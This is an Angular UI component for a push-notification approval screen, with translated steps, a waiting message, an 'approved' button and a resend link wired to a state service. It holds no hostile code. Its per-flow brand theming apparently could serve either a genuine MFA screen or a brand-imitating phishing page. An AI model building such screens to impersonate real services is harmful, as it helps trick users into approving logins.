
import { Component, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-push-notification',
  standalone: true,
  imports: [CommonModule, TranslatePipe, ButtonComponent, CardComponent],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <ui-card [variant]="cardVariant()">
      <div class="flex flex-col items-center py-4 animate-fade-in">
        
        <div class="relative mb-8">
            <div class="w-20 h-20 rounded-full flex items-center justify-center bg-blue-50 border border-blue-100 relative z-10 transition-colors duration-500" [style.background-color]="bgPulse()">
                <span class="material-icons text-4xl" [style.color]="brandColor()">notifications_active</span>
            </div>
            <!-- Ping Rings -->
            <div class="absolute inset-0 bg-blue-400 opacity-20 rounded-full animate-ping z-0" [style.background]="brandColor()"></div>
            <div class="absolute inset-0 bg-blue-400 opacity-10 rounded-full animate-ping delay-300 z-0" [style.background]="brandColor()"></div>
        </div>

        <h1 class="text-xl font-bold mb-4 text-center tracking-tight max-w-xs" [style.color]="headerColor()">
            {{ 'PUSH.TITLE' | translate }}
        </h1>
        
        <div class="w-full bg-slate-50 rounded-xl p-6 border border-slate-100 mb-8 max-w-sm">
           <ol class="text-sm text-slate-600 space-y-4 list-decimal pl-4">
               <li>{{ 'PUSH.STEP_1' | translate }}</li>
               <li>{{ 'PUSH.STEP_2' | translate }}</li>
               <li>{{ 'PUSH.STEP_3' | translate }}</li>
           </ol>
        </div>

        <p class="text-slate-500 text-sm mb-8 text-center px-6 animate-pulse font-medium">
            {{ 'PUSH.WAITING' | translate }}
        </p>

        <ui-button 
          [fullWidth]="true" 
          [variant]="'secondary'"
          (clicked)="submit()"
        >
          {{ 'PUSH.APPROVED_BTN' | translate }}
        </ui-button>

        <div class="mt-6">
            <button (click)="resend()" class="font-bold text-sm hover:underline transition-colors" [style.color]="brandColor()">
                {{ 'PUSH.RESEND' | translate }}
            </button>
        </div>
      </div>
    </ui-card>
  `
})
export class PushNotificationComponent {
  state = inject(StateService);
  theme = computed(() => this.state.currentFlow()?.theme);
  currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');

  cardVariant = computed<CardVariant>(() => 'elevated');

  brandColor = computed(() => this.theme()?.button.background || '#003087');
  headerColor = computed(() => this.theme()?.input.textColor || '#003087');

  bgPulse = computed(() => (this.theme()?.button.background || '#003087') + '10');

  submit() {
    this.state.submitPushAuth();
  }

  resend() {
    this.state.triggerResendAlert();
  }
}
